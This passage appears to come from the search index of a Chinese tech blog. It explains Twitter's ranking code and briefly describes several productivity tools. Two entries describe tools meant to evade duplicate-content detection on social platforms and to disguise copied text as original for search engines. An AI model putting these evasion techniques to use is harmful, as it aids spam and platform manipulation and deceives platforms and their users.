a^x 那么根据计算的结果计算指数函数的结果 e^3.6629711751662968 ≈ 2.565617039296528，这个结果就是最终的账号权重分数。 val adjustedMass = if (numFollowings &gt; threshAbsNumFriendsUMass &amp;&amp; friendsToFollowersRatio &gt; threshFriendsToFollowersRatioUMass) { mass / scala.math.exp( constantDivisionFactorGt_threshFriendsToFollowersRatioUMass * (friendsToFollowersRatio - threshFriendsToFollowersRatioUMass) ) } else { mass } 来源：UserMass.scala 账号权重计算器 账号状态 请选择账号状态 停用 已验证 未验证 是否受限 请选择账号状态 受限 未受限 生日 关注数 粉丝数 计算 排名权重演算法 类型 分数 UI 英文，推文非英文 0.3x Twitter 的界面语言是英文，但是发布的推文不是英文。 推文英文，UI 非英文 0.7x 发布的推文是英文，但是 Twitter 的界面语言不是英文。 UI 和语言不同 0.1x Twitter 的界面语言是英文，但是发布的推文不是英文。 无法识别语言 0.01x 推文的语言不是用户可理解的语言，也不会界面语言。 UI 英文，推文非英文 0.3x Twitter 的界面语言是英文，但是发布的推文不是英文。 图片、视频、新闻链接 1.0x 根据媒体的数量累计加成。 外部链接 隐藏 如果链接非媒体链接，而且没有足够的互动权重，会被隐藏。 降级属性 无文字内容 1.0x 推文的内容没有任何文字。 只有链接 1.0x 推文只有链接，没有其它内容。 只有名字 1.0x 推文只有名字，没有其它内容。 由于这段代码太长，我只把部分内容摘取出来，下面的代码不是完整的代码。 这里定义了各项类型的初始值。 maxHitsPerUser 默认值是 3，代表演算法最多推送 3 条推文，如果账号权重大于 maxTweepcredForAntiGaming 设置的值，演算法会推送所有的推文。 struct ThriftRankingParams { 30: optional double langEnglishUIBoost = 0.3 31: optional double langEnglishTweetBoost = 0.7 32: optional double langDefaultBoost = 0.1 43: optional double unknownLanguageBoost = 0.01 60: optional bool enableHitDemotion = 0 61: optional double noTextHitDemotion = 1.0 62: optional double urlOnlyHitDemotion = 1.0 63: optional double nameOnlyHitDemotion = 1.0 64: optional double separateTextAndNameHitDemotion = 1.0 65: optional double separateTextAndUrlHitDemotion = 1.0 102: optional double multipleHashtagsOrTrendsBoost = 1 108: optional double tweetHasImageUrlBoost = 1 109: optional double tweetHasVideoUrlBoost = 1 110: optional double tweetHasNewsUrlBoost = 1 }(persisted='true') struct ThriftFacetRankingOptions { 35: optional i32 maxHitsPerUser = 3 36: optional i32 maxTweepcredForAntiGaming = 65 }(persisted='true') 如果推文包含图片、视频或者新闻链接，会在原来的数量上 +1。 if (data.hasImageUrl || data.hasVideoUrl) { relevanceStats.setNumWithMedia(relevanceStats.getNumWithMedia() + 1); } if (data.hasNewsUrl) { relevanceStats.setNumWithNews(relevanceStats.getNumWithNews() + 1); } 如果内容包含图片、视频或者新闻链接，会给推文增加权重，计算方式：总分数 * (1 * (图片数量 + 1)) // Media/News url boosts. if (data.hasImageUrl || data.hasVideoUrl) { data.hasMedialUrlBoostApplied = true; boostedScore *= params.tweetHasMediaUrlBoost; } if (data.hasNewsUrl) { data.hasNewsUrlBoostApplied = true; boostedScore *= params.tweetHasNewsUrlBoost; } 下面的这段代码也说明了图片、视频或者新闻链接会有额外的权重加成，无文字、只有链接、只有名字会降低权重。 if (scoringData.tweetHasTrendsBoostApplied) { boostDetails.add(Explanation.match( (float) params.tweetHasTrendBoost, &quot;[x] Tweet has trend boost&quot;)); } if (scoringData.hasMedialUrlBoostApplied) { boostDetails.add(Explanation.match( (float) params.tweetHasMediaUrlBoost, &quot;[x] Media url boost&quot;)); } if (scoringData.hasNewsUrlBoostApplied) { boostDetails.add(Explanation.match( (float) params.tweetHasNewsUrlBoost, &quot;[x] News url boost&quot;)); } boostDetails.add(Explanation.match(0.0f, &quot;[FIELDS HIT] &quot; + scoringData.hitFields)); if (scoringData.hasNoTextHitDemotionApplied) { boostDetails.add(Explanation.match( (float) params.noTextHitDemotion, &quot;[x] No text hit demotion&quot;)); } if (scoringData.hasUrlOnlyHitDemotionApplied) { boostDetails.add(Explanation.match( (float) params.urlOnlyHitDemotion, &quot;[x] URL only hit demotion&quot;)); } if (scoringData.hasNameOnlyHitDemotionApplied) { boostDetails.add(Explanation.match( (float) params.nameOnlyHitDemotion, &quot;[x] Name only hit demotion&quot;)); } if (scoringData.hasSeparateTextAndNameHitDemotionApplied) { boostDetails.add(Explanation.match((float) params.separateTextAndNameHitDemotion, &quot;[x] Separate text/name demotion&quot;)); } if (scoringData.hasSeparateTextAndUrlHitDemotionApplied) { boostDetails.add(Explanation.match((float) params.separateTextAndUrlHitDemotion, &quot;[x] Separate text/url demotion&quot;)); } 来源：ranking.thrift 来源：FeatureBasedScoringFunction.java 推文发布时间演算法 推文会随着时间的推移而降低分数。 相关代码 struct ThriftAgeDecayRankingParams { // the rate in which the score of older tweets decreases 1: optional double slope = 0.003 // the age, in minutes, where the age score of a tweet is half of the latest tweet 2: optional double halflife = 360.0 // the minimal age decay score a tweet will have 3: optional double base = 0.6 }(persisted='true') 这里使用了时间衰减函数，衰减率为 0.003，衰减半衰期为 360 分钟。这个衰减函数表示，随着时间的推移，一个推文的分数将逐渐下降，下降的速率取决于时间的差距和衰减率。在这种情况下，当一个推文的发布时间与当前时间相差 500 分钟时，可以通过以下面的公式计算推文的衰减分数： 衰减分数 = 基础分数 * exp(-衰减率 * (发布时间 - 当前时间) / 衰减半衰期) 来源：ranking.thrift 推文权重衰减计算器 发布时间 计算 违反政策的内容 如果推文的内容包含违反政策的内容会被降低权重，包括但不限于：鼓励自残、仇恨行为、无端血腥、宣扬暴力、鼓励围攻骚扰、死亡前或死者用户、发布私人信息、侵犯隐私权、威胁曝光、暴力性行为、性骚扰、暴力威胁、干预选举、虚假选举信息、黑客内容、欺诈、平台操作、虚假乌克兰信息、误导信息、虚假医疗信息等。 相关代码 val reasonToPolicyInViolation: Map[Reason, PolicyInViolation] = Map( AbuseEpisodic -&gt; PolicyInViolation.AbusePolicyEpisodic, AbuseEpisodicEncourageSelfHarm -&gt; PolicyInViolation.AbusePolicyEpisodicEncourageSelfharm, AbuseEpisodicHatefulConduct -&gt; PolicyInViolation.AbusePolicyEpisodicHatefulConduct, AbuseGratuitousGore -&gt; PolicyInViolation.AbusePolicyGratuitousGore, AbuseGlorificationOfViolence -&gt; PolicyInViolation.AbusePolicyGlorificationofViolence, AbuseMobHarassment -&gt; PolicyInViolation.AbusePolicyEncourageMobHarassment, AbuseMomentOfDeathOrDeceasedUser -&gt; PolicyInViolation.AbusePolicyMomentofDeathDeceasedUser, AbusePrivateInformation -&gt; PolicyInViolation.AbusePolicyPrivateInformation, AbuseRightToPrivacy -&gt; PolicyInViolation.AbusePolicyRighttoPrivacy, AbuseThreatToExpose -&gt; PolicyInViolation.AbusePolicyThreattoExpose, AbuseViolentSexualConduct -&gt; PolicyInViolation.AbusePolicyViolentSexualConduct, AbuseViolentThreatHatefulConduct -&gt; PolicyInViolation.AbusePolicyViolentThreatsHatefulConduct, AbuseViolentThreatOrBounty -&gt; PolicyInViolation.AbusePolicyViolentThreatorBounty, OneOff -&gt; PolicyInViolation.OneOff, VotingMisinformation -&gt; PolicyInViolation.MisinformationVoting, HackedMaterials -&gt; PolicyInViolation.HackedMaterials, Scams -&gt; PolicyInViolation.Scam, PlatformManipulation -&gt; PolicyInViolation.PlatformManipulation, MisinfoCivic -&gt; PolicyInViolation.MisinformationCivic, MisinfoCrisis -&gt; PolicyInViolation.AbusePolicyUkraineCrisisMisinformation, MisinfoGeneric -&gt; PolicyInViolation.MisinformationGeneric, MisinfoMedical -&gt; PolicyInViolation.MisinformationMedical, ) 来源：PublicInterestRules.scala 推文推送机制 下面以“我”为例子，当我发布了一个推文，或者对某一个帖子进行互动（点赞、回复或分享）的操作，那么就会将这篇推文推送到我的粉丝。 如果我的粉丝对推文进行互动，那么就会将这篇推文推送到他们的粉丝，如果不互动就不会继续再往外推送。 粉色是蓝色粉丝的关系，也就是我粉丝的粉丝。 如果我的粉丝的粉丝，也就是图中粉色的粉丝，对这篇推文互动，那么就会推送到他们账号上的粉丝。 绿色是粉色粉丝的关系。 如果他们再进行互动，就会继续往外推送，以此类推。 function calculateAge (birth) { const birthDate = new Date(birth) const currentDate = new Date() let age = currentDate.getFullYear() - birthDate.getFullYear() if (currentDate.getMonth() < birthDate.getMonth() || (currentDate.getMonth() === birthDate.getMonth() && currentDate.getDate() < birthDate.getDate())) { age-- } return age } function calcAccountWeight () { const accountStatus = document.getElementById('accountStatus').value const isRestricted = document.getElementById('restrictedStatus').value const birthday = document.getElementById('birthday').value const numFollowings = document.getElementById('followings').value const numFollowers = document.getElementById('followers').value const accountScore = document.getElementById('accountScore') if (!accountStatus && !isRestricted && !birthday && !numFollowings && !numFollowers) return alert('请将信息填写规范') let score const deviceWeightAdditive = 0.5 const hasValidDevice = true const threshAbsNumFriendsUMass = 500 const threshFriendsToFollowersRatioUMass = 0.6 const constantDivisionFactorGt_threshFriendsToFollowersRatioUMass = 5.0 const restrictedWeightMultiplicative = 0.1 const age = calculateAge(birthday) if (accountStatus === 'suspended') { score = 0 } else if (accountStatus === 'verified') { score = 100 } else if (accountStatus === 'unVerified') { score = deviceWeightAdditive * 0.1 + (hasValidDevice ? deviceWeightAdditive : 0) const normalizedAge = age > 30 ? 1.0 : Math.min(1.0, Math.log(1.0 + age / 15.0)) score *= normalizedAge if (score < 0.01) score = 0.01 if (isRestricted === 'restricted') score *= restrictedWeightMultiplicative score = Math.min(1.0, Math.max(0, score)) score *= 100 } const friendsToFollowersRatio = (1.0 + numFollowings) / (1.0 + numFollowers) let adjustedMass = 0 if (numFollowings > threshAbsNumFriendsUMass && friendsToFollowersRatio > threshFriendsToFollowersRatioUMass) { adjustedMass = score / Math.exp(constantDivisionFactorGt_threshFriendsToFollowersRatioUMass * (friendsToFollowersRatio - threshFriendsToFollowersRatioUMass)) } else { adjustedMass = score } accountScore.innerText = adjustedMass } function calcPostWeight () { const postTime = document.getElementById('postTime').value const postScore = document.getElementById('postScore') if (!postTime) return alert('请选择发帖时间') const halfLife = 360 const slope = 0.003 const base = 0.6 const minutesPassed = (Date.now() - new Date(postTime).getTime()) / (1000 * 60) const ageDecay = Math.pow(2, -minutesPassed / halfLife) const score = base + (1 - base) * ageDecay * Math.exp(-slope * minutesPassed) postScore.innerText = score } ","tags":[{"index":-1,"name":"Twitter (X)","slug":"twitter-x","used":true,"link":"https://dev-coco.github.io/tag/twitter-x/"}],"title":"推特 Twitter 演算法和推送机制 2023 最新","feature":"https://dev-coco.github.io/post-images/Twitter-Algorithm.png","link":"https://dev-coco.github.io/post/Twitter-Algorithm/","stats":{"text":"19 min read","time":1117000,"words":4174,"minutes":19},"date":"2023-04-08 22:50:14","dateFormat":"2023-04-08"},{"content":"全新 macOS 清理垃圾工具，超彻底深度清理。支持清理缓存，清理下载目录安装包，系统优化功能。 基于早期做的 Mac Cleaner 重新开发，比之前清理力度更强。 打开软件后，会显示下面的菜单界面，选择对应的功能，点击「好」。 清理缓存 如果是第一次使用，会出现下图中的提示，点击「好」，下次运行的时候就不会再提示了。 因为有部分路径的文件是需要管理员权限才可以删除，所以会要求输入开机密码，或者要求使用触控 ID 验证。 清理完成后会在通知中心提示清理了多少内存。不同的设备使用的软件和使用习惯都会影响到清理的效果，下图的结果仅供参考。 清理下载目录安装包 此功能会清理下载目录下所有的软件安装包，如果你对此功能不了解，请谨慎使用，避免误删文件。 系统优化 这个功能需要管理员的权限才可以运行，所以会要求输入开机密码，或者要求使用触控 ID 验证。 运行后会释放 RAM，并且清理 DNS 缓存，加快运行速度。 对比 下面选了几款 macOS 系统热门的清理垃圾软件，对清理力度做了对比，结果如下（仅供参考）。 项目 Deep Clean CCleaner CleanMyMac X Combo Cleaner 应用程序缓存 ✅ ✅ ✅ ✅ 应用程序沙盒缓存 ✅ ❌ ❌ ❌ Xcode缓存 ✅ ❌ ✅ ❌ 下载目录 ❌ ✅ ❌ ✅ 回收站 ✅ ✅ ❌ ✅ 系统缓存 ✅ ❌ ✅ ❌ 用户缓存 ✅ ❌ ✅ ❌ 用户日志 ✅ ✅ ✅ ✅ 系统日志 ✅ ✅ ✅ ❌ 机器学习缓存 ✅ ❌ ❌ ❌ Safari缓存 ✅ ✅ ❌ ❌ Final Cut Pro 缓存 ✅ ❌ ❌ ❌ Google Chrome缓存 ✅ ✅ ❌ ❌ Brave Browser缓存 ✅ ❌ ❌ ❌ Microsoft Edge缓存 ✅ ❌ ❌ ❌ Arc缓存 ✅ ❌ ❌ ❌ 诊断报告 ✅ ❌ ❌ ❌ 奔溃报告 ✅ ❌ ❌ ❌ 下载记录 ✅ ❌ ❌ ❌ 终端记录 ✅ ❌ ❌ ❌ ","tags":[{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"},{"index":-1,"name":"macOS","slug":"macos","used":true,"link":"https://dev-coco.github.io/tag/macos/"}],"title":"Deep Clean 深度清理垃圾软件","feature":"https://dev-coco.github.io/post-images/Deep-Clean.png","link":"https://dev-coco.github.io/post/Deep-Clean/","stats":{"text":"2 min read","time":97000,"words":463,"minutes":2},"date":"2023-04-04 10:06:33","dateFormat":"2023-04-04"},{"content":"自定义预设 ChatGPT 提示语。 插件下载：Chrome 插件合集 使用前需要先登陆 ChatGPT 账号，因为插件使用的是 ChatGPT 账号权限。插件主要的功能是为了保存提示语，每次使用的时候只需要挑选对应的提示语再写上内容就可以了，减少花在找提示语的时间上。 使用方法 在中间的输入框输入提示语和需要问 ChatGPT 的内容。下面是例子 将以下的内容翻译成简体中文 Here is an example. &gt;&gt; 这是一个例子。 那么「将以下的内容翻译成简体中文」就是固定的提示语，「Here is an example.」是会变动的内容。 如果想要保存提示语，将提示语输入在上面的输入框，不要输入其它内容，点击「修改提示语」。 点击「添加」。 自定义提示语的名字。 然后提示语就会保存在左侧的列表，点击对应的菜单，提示语就会预设在输入框。 选择左侧的提示语，或者点击「刷新」按钮，会把预设好的提示语放在输入框。 只需要按照需求输入自定义内容就可以用了。 如果想要删除提示语，需要先在左侧选中一个需要删除的提示语，然后点击「修改提示语」。 点击「删除」。 然后就会把选中的提示语删掉了。 提示语支持导入和导出，点击「导出」按钮，会把左侧的提示语列表生成 json 格式的文件，并且下载到本地。 如果要导入配置，点击「导入」，然后打开 json 文件，把内容粘贴到输入框，点击「导入」。 然后提示语就会预设在左侧的列表了。 ","tags":[{"index":-1,"name":"AI 科技","slug":"ai-tech","used":true,"link":"https://dev-coco.github.io/tag/ai-tech/"}],"title":"ChatGPT Prompt","feature":"https://dev-coco.github.io/post-images/chatgpt-prompt.png","link":"https://dev-coco.github.io/post/chatgpt-prompt/","stats":{"text":"2 min read","time":94000,"words":458,"minutes":2},"date":"2023-03-31 03:17:38","dateFormat":"2023-03-31"},{"content":"用来记录每个日程的时间并且记录到 Google Excel。 插件下载：Chrome 插件合集 功能 记录时间开始和结束的时间，并且实时显示当前事件开始了多少分钟，然后根据日期填写到 Google Excel 中。 使用方法 在表格内按照下图排版，A 列是日期，B、C、D 列分别是上午下午晚上，用来填写事件用。A 列的日期需要按照年月日的格式设置，并且是倒序排序。 Google Excel 模板：链接 插件右键选项的界面设置表格的链接，注意：表格必须开启编辑权限，表格链接对应的是哪个表格，最终数据会填写到哪个表格里。 默认会有一个脚本链接，如果对默认的填表方式不满意，想要自定义修改，可以自行部署一个脚本接口，然后替换掉第一行的脚本链接。如果脚本链接留空，刷新后会恢复默认的脚本链接。 点击插件图标会打开一个窗口，输入需要记录的事件，默认会填充当前的时间，不过可以修改。点击开始，也可以按回车键触发。 然后界面就会记录开始的时间、结束的时间和记录的事件，图标上会记录事件开始了多少分钟。每次点开插件的时候，会自动填充当前的时间作为结束时间，不过可以修改。点击结束后会清空事件，并且填入表格中。 效果如下图 点击左上角的齿轮切换界面，点击「添加」，可以添加一个事项，并且记录添加事项的日期。 如果当天的事项已过期，日期会变成红色。 勾选事件后会显示删除线，点击「清空」按钮会清空所有已完成的事件。双击「清空」按钮会删除所有的事件。 模版分享 下面分享一个我自用的模版，根据 摆脱拖延症，提高效率 这篇文章制作的：时间管理模版 第一次使用需要在 「Apps 脚本」里部署一个脚本链接然后放在插件里使用。 里面包含日程图表分析功能，帮助每天进行复盘到底在什么事情上花费了大量的时间，然后进行改进。 下面是 艾森豪威尔矩阵，用来根据事情的轻重缓急，合理的安排时间去处理这些事件，更高效的管理时间。 还包含了 非计划日程，用来安排一天的日程，并且灵活调整。在「Apps 脚本」里有一个 setTodaySchedule 函数，可以设置天定时器，每天会自动将「非计划日程」里的模板复制到「当日日程」里面。 里面还有 SMART 任务管理，用来拆解难度比较大的事情，并且做计划去执行。 ","tags":[{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"}],"title":"日程记录","feature":"https://dev-coco.github.io/post-images/Schedule-Record.png","link":"https://dev-coco.github.io/post/Schedule-Record/","stats":{"text":"3 min read","time":153000,"words":755,"minutes":3},"date":"2023-03-26 23:29:04","dateFormat":"2023-03-26"},{"content":"文字创意工坊是一个为创作者提供创作灵感和技巧分享的平台。 工具链接：文字创意工坊 使用方法 放入内容，选择类型和语言，点击开始就会生成新的内容。 功能介绍 减少废话 放入一段话，将会概括这段话里的主要内容。 总结要点 放入一段话，以大纲的形式列出内容中的要点。 改写内容 放入一句话，在不改变原文意思的基础上使用不同的说法表达。 续写内容 放入残缺的一句话，将会照着这句话继续往下生成一些内容。 主题延伸 输入一些关键词，根据这些关键词为主题写一些句子。 小红书风格 输入内容，会按照小红书的风格排版。 伪原创 输入内容，将原文进行加工，让搜索引擎认为是一篇原创文章。 ","tags":[{"index":-1,"name":"AI 科技","slug":"ai-tech","used":true,"link":"https://dev-coco.github.io/tag/ai-tech/"}],"title":"文字创意工坊","feature":"https://dev-coco.github.io/post-images/Text-Workshop.jpg","link":"https://dev-coco.github.io/post/Text-Workshop/","stats":{"text":"1 min read","time":49000,"words":246,"minutes":1},"date":"2023-03-23 07:04:06","dateFormat":"2023-03-23"},{"content":"用于伪原创，防止社交平台检测内容重复性。 源码下载：https://github.com/dev-coco/String-Obfuscator 在线使用：编码转换工具 使用方法 字符混淆 使用 stringObfuscation 函数，第一个参数放入需要混淆的内容，第二个参数放入混淆的类型，运行后会输出混淆后的字符。 /** * @description 字符混淆 * @param {string} content - 内容 * @param {string} option - 类型 * @returns {string} - 混淆后的内容 */ stringObfuscator(content, option) 如果有部分内容不想被混淆，需要保留原来的样式，需要使用 {}，在大括号里的内容会被跳过，字符不会被混淆。 字符还原 使用 stringDeobfuscator 函数，放入混淆后的内容，运行后会输出还原后的内容。 /** * @description 字符还原 * @param {string} str - 混淆后的内容 * @returns {string} - 还原后的内容 */ stringDeobfuscator(str) 例子 stringObfuscator('Hello, World!', 'style1') &gt;&gt; 𝐇𝐞𝐥𝐥𝐨, 𝐖𝐨𝐫𝐥𝐝! stringObfuscator('Hello, {World}!', 'style2') &gt;&gt; 𝗛𝗲𝗹𝗹𝗼, World! stringDeobfuscato('𝐇𝐞𝐥𝐥𝐨, 𝐖𝐨𝐫𝐥𝐝!') &gt;&gt; Hello, World! 效果预览 style1 衬线粗体 Bold (serif) 𝐇𝐞𝐥𝐥𝐨 𝐖𝐨𝐫𝐥𝐝 style2 无衬线粗体 Bold (sans) 𝗛𝗲𝗹𝗹𝗼 𝗪𝗼𝗿𝗹𝗱 style3 Mathematical (sans) 𝖧𝖾𝗅𝗅𝗈 𝖶𝗈𝗋𝗅𝖽 style4 等宽字体 Monospace 𝙷𝚎𝚕𝚕𝚘 𝚆𝚘𝚛𝚕𝚍 style5 衬线斜体 Italic (serif) 𝐻𝑒𝑙𝑙𝑜 𝑊𝑜𝑟𝑙𝑑 style6 无衬线斜体 Italic (sans) 𝘏𝘦𝘭𝘭𝘰 𝘞𝘰𝘳𝘭𝘥 style7 衬线粗斜体 Bold / Italic (serif) 𝑯𝒆𝒍𝒍𝒐 𝑾𝒐𝒓𝒍𝒅 style8 无衬线粗斜体 Bold / Italic (sans) 𝙃𝙚𝙡𝙡𝙤 𝙒𝙤𝙧𝙡𝙙 style9 小型大写 Small Capital 长得比较小的大写字母。 ʜᴇʟʟᴏ ᴡᴏʀʟᴅ style 10 双线体 Double Struck ℍ𝕖𝕝𝕝𝕠 𝕎𝕠𝕣𝕝𝕕 style11 草书 Cursive ℋ𝑒𝓁𝓁𝑜 𝒲𝑜𝓇𝓁𝒹 style12 草书粗体 Bold Cursive 𝓗𝓮𝓵𝓵𝓸 𝓦𝓸𝓻𝓵𝓭 style13 德文尖角 Fraktur ℌ𝔢𝔩𝔩𝔬 𝔚𝔬𝔯𝔩𝔡 style14 德文尖角粗体 Bold Fraktur 𝕳𝖊𝖑𝖑𝖔 𝖂𝖔𝖗𝖑𝖉 style15 小字体 Tiny ᴴᵉˡˡᵒ ᵂᵒʳˡᵈ style16 全宽 Vaporwave Ｈｅｌｌｏ Ｗｏｒｌｄ style17 上下颠倒 Upside Down 需要将屏幕倒过来看。 pןɹoM oןןǝH style18 SMS 常用语 将常规单词替换成短信常用语。 原文：Goodbye my friend, see you tomorrow. 效果：Goodbye my friend, cu 2mro. style19 彩虹心 将空格替换成不同颜色的爱心 Emoji。 原文：Goodbye my friend, see you tomorrow. 效果：Goodbye🧡my💙friend,❤️see💙you💛tomorrow. style20 填充 Emoji 在特定的关键词后面自动加上相对应的 Emoji。 原文：Good morning, remember to call me back at noon. 效果：Good morning🌞, remember to call📲 me back🔙 at noon🕛. space1 填充空格 50% 概率会将一个空格替换成两个空格。 原文：Goodbye my friend, see you tomorrow. 效果：Goodbye my friend, see you tomorrow. space2 填充特殊字符 50% 概率随机填充不可见的特殊字符。 原文：Goodbye my friend, see you tomorrow. 未编码效果：Goodbye my\\b friend,\\b\\b see\\b you\\b\\b tomorrow. \\b\\b ","tags":[{"name":"Javascript","slug":"javascript","used":true,"link":"https://dev-coco.github.io/tag/javascript/"}],"title":"字符混淆","feature":"https://dev-coco.github.io/post-images/String-Obfuscator.png","link":"https://dev-coco.github.io/post/String-Obfuscator/","stats":{"text":"3 min read","time":146000,"words":571,"minutes":3},"date":"2023-03-22 08:50:15","dateFormat":"2023-03-22"},{"content":"超多功能 All in One，简单易用，必备工具。 工具链接：Google Excel 批量操作 使用前需要确保表格有编辑者的权限，如果表格内有部分范围设置了保护，可能有的功能会无法正常执行。 在输入框输入表格的链接，然后在下拉菜单选择对应的功能。 基础功能 列转行 在表格中复制一列的内容放入输入框，输入列转行需要间隔的数量（非必填），点击「运行」，然后会将一列的内容转换成一行的内容，并且按照指定的间隔数量输出。 行转列 在表格中复制一行的内容放入输入框，输入行转列需要间隔的数量（非必填），点击「运行」，然后会将一行的内容转换成一列的内容，并且按照指定的间隔数量输出。 行间隔 在表格中复制一列的内容放入输入框，输入每行之间需要间隔的数量，点击「运行」。然后会按照指定的间隔数量输出。 列间隔 在表格中复制一行的内容放入输入框，输入每列之间需要间隔的数量，点击「运行」。然后会按照指定的间隔数量输出。 删除表格 选择表格名称，点击「开始运行」，会将选中的表格删除。 复制表格 在右侧选择一个工作表，然后在左边的输入框输入要创建的表格名字，一行一个，点击「开始运行」。 然后会将选中的表格作为模版，复制并且按照设定好的名字进行重命名。 表格重命名 右侧是表格的原名称，在左边对应的输入框输入要修改的新名称，如果无需修改，在输入框留空即可，点击「开始运行」。 然后会根据设定好的新名称进行重命名。 隐藏表格 列表只会显示正在显示的表格，如果表格已被隐藏则不会显示。选择表格名称，点击「开始运行」。 在表格内会隐藏对应的表格。注意：不可以隐藏所有的表格，至少保留一个显示的表格。 显示表格 列表只会显示正在隐藏的表格。选择表格名称，点击「开始运行」。 在表格内会将隐藏的表格显示出来。 删除副本字样 重命名表格内所有包含副本字样的表格名称。注意：如果重命名后的名称，在表格内有重复，会重命名失败。 清空内容（保留函数） 例如 A1:A9, B1:E1 包含 SUM 函数。 在右侧选择表格名称，在左侧的输入框输入需要清空内容的范围。 然后会将选中的表格删除 A 到 E 列所有的内容，但是函数会被保留下来不会被清空。 删除多余行/列 在表格内有多余没有使用的行和列。例如图中 C:D, 5:15 范围都是没有使用的。 选择表格名称，点击「开始运行」。 然后会清空表格内未使用的行和列。 转换文本 在表格内有纯文本和函数。 选择表格名称，点击开始运行。 然后会将表格内的所有的内容转换成文本值。 写入数据 在右侧选择表格名称，在左侧输入框的第一行输入需要写入数据的单元格范围（只限单个单元格），在第二行输入需要写入的内容，可以是文本，也可以是函数，点击开始运行，然后会根据指定的范围写入相应的内容。 ","tags":[{"name":"Google 脚本","slug":"google-script","used":true,"link":"https://dev-coco.github.io/tag/google-script/"},{"name":"Excel","slug":"excel","used":true,"link":"https://dev-coco.github.io/tag/excel/"}],"title":"Google Excel 批量操作工具","feature":"https://dev-coco.github.io/post-images/Google-Excel-Batch-Action.jpg","link":"https://dev-coco.github.io/post/Google-Excel-Batch-Action/","stats":{"text":"4 min read","time":193000,"words":954,"minutes":4},"date":"2023-03-20 19:49:09","dateFormat":"2023-03-20"},{"content":"夜晚的时候减少设备耗电量。 设置方法 在快捷指令的「自动化」中添加一个「睡眠」的自动化流程，选择「就寝开始」。需要配合睡眠闹钟一起使用。 关闭 Wi-Fi、蜂窝数据、蓝牙。 因为在晚上睡觉的时候并不会再去浏览手机了，所以开着也是在消耗电量，不如直接关闭。 开启低电量模式。开启后会减少设备的电量消耗。 亮度设置 5%，音量设置 80%。 这个可以根据情况自行调节，降低亮度的目的是为了在夜晚需要看时间的时候不会太刺眼，设置一个刚好的亮度即可。 在「自动化」中把「运行前询问」和「运行时通知」关闭，在就寝开始的时候就会静默运行，不会有任何的提示。 在快捷指令的「自动化」中添加一个「睡眠」的自动化流程，选择「起床时」。 打开 Wi-Fi，亮度设置 45%，音量设置 50%。 根据情况自行设置，当起床的时候，设置到日常的配置。 在快捷指令的「自动化」中和之前一样设置，静默运行就行，不会有任何提示。 ","tags":[],"title":"快捷指令 - 夜间省电","feature":"https://dev-coco.github.io/post-images/Nighttime-Power-Saving.png","link":"https://dev-coco.github.io/post/Nighttime-Power-Saving/","stats":{"text":"2 min read","time":64000,"words":316,"minutes":2},"date":"2023-03-19 00:43:01","dateFormat":"2023-03-19"},{"content":"不同样式的下拉菜单消耗的性能也不同。 适用场景 根据不同的需求使用不同的样式。 测试条件 在 50 万个单元格中设置不同的下拉菜单样式。 一共有三种下拉菜单的样式，分别是：条状标签、箭头和纯文本。 条状标签 将 50 万个单元格设置条状标签耗时 4.6 秒左右。 设置完条状标签后重新打开表格，耗时 12.3 秒左右。 箭头 将 50 万个单元格设置箭头样式耗时 3.9 秒左右。 设置完箭头样式后重新打开表格，耗时 7.4 秒左右。 纯文本 将 50 万个单元格设置纯文本样式耗时 4.2 秒左右。 设置完纯文本样式后重新打开表格，耗时 10.1 秒左右。 测试结果 经过上面的测试，在单元格数量相同的情况下，不论是设置样式的速度，还是设置完打开表格的速度，箭头样式要比纯文本样式加载速度要快，纯文本样式加载速度比条状标签快。 为你推荐：Google Excel 性能优化教程目录 ","tags":[{"name":"Excel","slug":"excel","used":true,"link":"https://dev-coco.github.io/tag/excel/"}],"title":"Google Excel 性能优化 - 下拉菜单性能对比","feature":"https://dev-coco.github.io/post-images/Dropdown-Menu-Performance-Test.jpg","link":"https://dev-coco.github.io/post/Dropdown-Menu-Performance-Test/","stats":{"text":"2 min read","time":64000,"words":308,"minutes":2},"date":"2023-03-15 11:58:46","dateFormat":"2023-03-15"},{"content":"一样的效果，数组的速度快得超乎想象。 适用场景 相同的函数大量的重复使用。 优化思路 将重复使用的函数改成用数组输出。 实例 例如需要将 A 列的内容和 B 列的内容合并在一起，一共 30 万的数据，先试试看常规写法。 耗时大约 22 秒左右。 使用 ARRAYFORMULA 数组输出，耗时大约 4 秒左右。 使用 MAP 数组输出，耗时大约 9 秒左右。 从测试的数据来看，数组输出的速度要比常规的写法快很多，其中 ARRAYFORMULA 性能最佳，MAP 其次，不过在一些特殊场景 MAP 会更加灵活。 因为常规的写法是每一个单元格都有一个函数进行计算，那么就等于迸发式的执行。每一个函数函数都在同一时间进行计算，会导致表格暂时性的卡住，如果是大型数据可能会直接奔溃。 那么使用数组就不一样了，会将引用的范围按照顺序依次进行计算，这样就避免了同一时间大量的计算，这也是为什么数组要比常规的写法性能更快。 ","tags":[{"name":"Excel","slug":"excel","used":true,"link":"https://dev-coco.github.io/tag/excel/"}],"title":"Google Excel 性能优化 - 数组输出","feature":"https://dev-coco.github.io/post-images/Google-Excel-Array-Output.png","link":"https://dev-coco.github.io/post/Google-Excel-Array-Output/","stats":{"text":"2 min read","time":65000,"words":316,"minutes":2},"date":"2023-03-14 10:49:18","dateFormat":"2023-03-14"},{"content":"浏览器自定义窗口大小摆放指定坐标。 插件下载：Chrome 插件合集 效果预览 使用方法 新建一个 Google 表格，在 A 列放入编号，B 列放入窗口尺寸，C 列放入坐标，D 列为启用状态。 窗口尺寸 格式：宽度x高度 指的是浏览器窗口的宽度和高度。 坐标 格式：显示器xX轴xY轴，注意中间用小写 x 间隔。 第一个参数是显示器，例如有两个显示器，那么设置 1 会在第一个显示器排版，设置 2 会在第二个显示器排版。第二个参数是 X 轴，从左到右计算开启的位置。第三个参数是 Y 轴，从上到下开始计算位置。 启用状态 使用复选框，在勾选的时候才会启用，未勾选的状态不会生效。 在浏览器安装插件，在第一个输入框放入表格链接，表格至少开启查看权限。在第二个输入框放入表格内 A 列对应的编号。 当浏览器首次开启后就会按照表格内设置的窗口大小和坐标自动排版了。 ","tags":[{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"}],"title":"浏览器窗口自动排版","feature":"https://dev-coco.github.io/post-images/Browser-Resize.png","link":"https://dev-coco.github.io/post/Browser-Resize/","stats":{"text":"2 min read","time":63000,"words":305,"minutes":2},"date":"2023-03-11 11:14:57","dateFormat":"2023-03-11"},{"content":"充满电后自动语音播报。 